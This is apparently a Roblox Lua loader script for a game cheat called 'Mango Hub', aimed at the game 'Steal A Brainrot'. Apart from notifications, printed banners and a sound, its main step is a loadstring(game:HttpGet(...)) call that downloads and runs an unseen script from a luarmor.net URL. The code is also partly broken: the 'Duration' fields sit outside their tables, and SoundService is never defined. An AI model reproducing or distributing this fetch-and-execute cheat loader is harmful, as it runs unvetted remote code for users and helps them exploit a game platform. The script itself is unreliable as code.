-- Hack
    print("We are hackers")
    
-- NotificationSender
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "🥭 Mango Notification";
	Text = "🥭 Mango Loader V.1.0";
	Icon = "rbxthumb://type=Asset&id=71967665601624&w=150&h=150"})
Duration = 15;

-- Print The Messages
print("🥭 Mango Hub Steal A Brainrot 🥭")

-- Anti Brake Print
print("🥭 Mango Hub Loader 1.0 🥭")

-- Load Print
print("⬇️ Loading")

-- NotificationSender
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "🥭 Mango Notification";
	Text = "⬇️ Loading";
	Icon = "rbxthumb://type=Asset&id=71967665601624&w=150&h=150"})
Duration = 15;

-- Loads The Script
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c4281c3937ebd537cb9e860182e41141.lua"))()

-- Sound Effects
local function playSound(soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://" .. soundId
    sound.Parent = SoundService
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

-- Play initial sound
playSound("2865227271")

-- Notify That Is Loaded
print("🥭 Mango Hub Loaded! 🥭")

-- NotificationSender
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "🥭 Mango Notification";
	Text = "✅ Script Success Fully Loaded.";
	Icon = "rbxthumb://type=Asset&id=71967665601624&w=150&h=150"})
Duration = 15;

-- Made By Message
print("❤️ Made By LuaDev ❤️")

-- NotificationSender
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "🥭 Mango Notification";
	Text = "© Made By LuaDev";
	Icon = "rbxthumb://type=Asset&id=71967665601624&w=150&h=150"})
Duration = 15;
